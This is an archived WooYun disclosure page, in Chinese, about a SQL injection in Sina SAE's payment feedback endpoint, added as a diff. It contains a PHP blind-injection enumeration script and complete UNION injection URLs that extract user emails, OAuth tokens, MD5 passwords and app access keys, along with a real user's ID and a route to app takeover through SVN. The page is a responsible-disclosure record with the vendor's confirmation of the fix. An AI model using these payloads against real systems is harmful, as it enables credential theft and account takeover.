@@ -1,0 +1,320 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪SAE沦陷，oauth token/安全密码全部泄露，hack任意app  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪SAE沦陷，oauth token/安全密码全部泄露，hack任意app  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/牛奶坦克">牛奶坦克</a> 
+</li><li>提交时间：		2012-08-22 19:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-09-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-09-11：	细节向普通白帽子公开<br/>
+									2012-09-21：	细节向实习白帽子公开<br/>
+									2012-10-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">下午本打算给SAE冲几个云豆试试短信功能，因为很久没黑箱了，就想看看支付问题，结果却发现另一个漏洞，可以获取sae上你想到的所有信息，危及所有用户，一泻千里啊一泻千里，顺手带走了“互联网那点事”（此站建立在SAE上），测试了以下沦陷任意SAE站点的想法...<br />
+<br />
+不过官方大可放心，并没有拖库也没有看订单信息，赶紧修复吧：）<br />
+PS：没想到啊没想到，还没研究sae沙箱环境，在主站就找到了短板，而且短的可怕。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题归根结底是一个SQL注入，SAE为什么会有注射？想完抽了自己一巴掌，SAE为什么不能有注射？！<br />
+<br />
+一般明面的问题sina安全团队可以发现，而且也会被过路黑客帮忙检测，凭着直觉，问题会出现在一些角落，一些不被人注意到的地方，就在这里：<br />
+<br />
+</p><pre><code>http://sae.sina.com.cn/pay/result/xft?sae_internal=1&amp;may_fail=0&amp;order_id=1</code></pre><p class='detail'><br />
+<br />
+一个付费信息反馈页面，用sqlmap跑了一下，这个傻缺居然告诉我只能盲注。。。自己写了个临时脚本跑数据库。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$url = &quot;http://sae.sina.com.cn/pay/result/xft?sae_internal=1&amp;may_fail=0&amp;order_id=1&#039;&quot;;<br />
+<br />
+for ($i=0; $i &lt; 1000; $i++) {  //很搓吧。。<br />
+	$res = explode(&quot;|&quot;,curlrequest($url.urlencode(&quot; and 1=2 union select 1,concat(0x7c,COLUMN_NAME,0x7c),3,4,5 from information_schema.COLUMNS where TABLE_NAME=&#039;user&#039; limit $i,1#&quot;)));<br />
+	echo $res[10].&quot;\r\n&quot;;<br />
+}<br />
+<br />
+省略curl定义</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+部分数据<br />
+<br />
+</p><pre><code>database:<br />
+information_schema<br />
+app_store<br />
+cron<br />
+cron2<br />
+cron_result<br />
+mysql_stat<br />
+sae<br />
+sae_java<br />
+sae_nodejs<br />
+swsUser<br />
+test<br />
+xweibo<br />
+<br />
+admin表    -&gt;   <br />
+id<br />
+sws_uid<br />
+name<br />
+password<br />
+email<br />
+timeline<br />
+role<br />
+s_mail<br />
+mobile<br />
+<br />
+app表存放app相关信息，比如名称\accesskey  --&gt;<br />
+name<br />
+cn_name<br />
+api_version<br />
+biz_type<br />
+desp<br />
+default_version<br />
+cname<br />
+create_uid<br />
+accesskey<br />
+group_name<br />
+pool_name<br />
+svn_url<br />
+status<br />
+timeline<br />
+mysql_port<br />
+old_status<br />
+hash<br />
+cookie<br />
+platform<br />
+lang<br />
+app_type<br />
+middle_type<br />
+icon<br />
+status_flags<br />
+delete_time<br />
+<br />
+user表存放用户所有信息，uid、oauth、email、sae的二次安全密码  --&gt; <br />
+id<br />
+name<br />
+email<br />
+password_md5<br />
+mobile<br />
+tel<br />
+status<br />
+timeline<br />
+expires<br />
+sws_uid<br />
+old_status<br />
+level<br />
+deleted<br />
+money<br />
+platform<br />
+beans_level<br />
+mobile_verified<br />
+mobile_reverified<br />
+is_active<br />
+weibo_uid<br />
+weibo_name<br />
+email_verified<br />
+weibo_access_token<br />
+devlevel<br />
+vdun<br />
+olevel<br />
+level_endtime<br />
+level_notify<br />
+up_welcomed<br />
+appmid<br />
+is_qy_vendor<br />
+last_update<br />
+userName</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+省去过多的猜测部分了，直接查询互联网那点事的用户相关信息<br />
+<br />
+http://sae.sina.com.cn//pay/result/xft?sae_internal=1&amp;may_fail=0&amp;order_id=-1%27%20and%201=2%20union%20select%201,concat%280x7c,email,0x7c,weibo_name,0x7c,weibo_access_token,0x7c,password_md5,0x7c%29,3,4,5%20from%20sae.user%20where%20weibo_uid=&#039;1627825392&#039;%20limit%200,1%23<br />
+<br />
+</p><p class="detail"><a href="../images/221948393faacd9db3c9ae6795ed1b81f9a8eb32.png" target="_blank"><img src="../images/221948393faacd9db3c9ae6795ed1b81f9a8eb32.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/22194850f9afc587af0a2aced340f7e0ea73506c.png" target="_blank"><img src="../images/22194850f9afc587af0a2aced340f7e0ea73506c.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+那个md5密码就是sae二次安全密码，这个密码还有牛比的用途，后面说。<br />
+<br />
+<br />
+<br />
+还可以查询accesskey<br />
+<br />
+http://sae.sina.com.cn//pay/result/xft?sae_internal=1&amp;may_fail=0&amp;order_id=-1%27%20and%201=2%20union%20select%201,concat%280x7c,accesskey,0x7c,create_uid,0x7c%29,3,4,5%20from%20sae.app%20limit%200,1%23<br />
+<br />
+</p><p class="detail"><a href="../images/221940005968d0018460002b5100931eb33d3288.png" target="_blank"><img src="../images/221940005968d0018460002b5100931eb33d3288.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+可以看出想控制一个app所需的信息全部齐全了。。<br />
+<br />
+<br />
+<br />
+8过，还可以利用更简单的方法，svn，sae svn的密码就是sae二次安全密码，嘿嘿。<br />
+<br />
+</p><p class="detail"><a href="../images/2219405643719a3473a4cd2c277cb0ff33b133aa.png" target="_blank"><img src="../images/2219405643719a3473a4cd2c277cb0ff33b133aa.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2219411008d871dc621ceaebab1d6278760bfb43.png" target="_blank"><img src="../images/2219411008d871dc621ceaebab1d6278760bfb43.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+好了，试试黑掉sae上任意的app吧。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/221942021a944c9e568948f44e88bc6150367851.png" target="_blank"><img src="../images/221942021a944c9e568948f44e88bc6150367851.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/22194210ead75f3c9748998979dc54c3748b1a23.png" target="_blank"><img src="../images/22194210ead75f3c9748998979dc54c3748b1a23.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/222348445d2d3831fcd6cbea58718edfb818a993.png" target="_blank"><img src="../images/222348445d2d3831fcd6cbea58718edfb818a993.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+证明完毕，结贴。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">其实就是个注射而已，但是数据库如此透明想不通，权限。。<br />
+<br />
+可以在数据库内找到想要的一切信息啊，是不是需要反省下？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/牛奶坦克" title="牛奶坦克">牛奶坦克</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011189" title="新浪SAE沦陷，oauth token/安全密码全部泄露，hack任意app">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-08-22 21:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">多谢牛奶坦克，此问题已经修复。<br />
+现在的密码已经是进行加盐处理过的，请大家放心使用。<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="11189";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
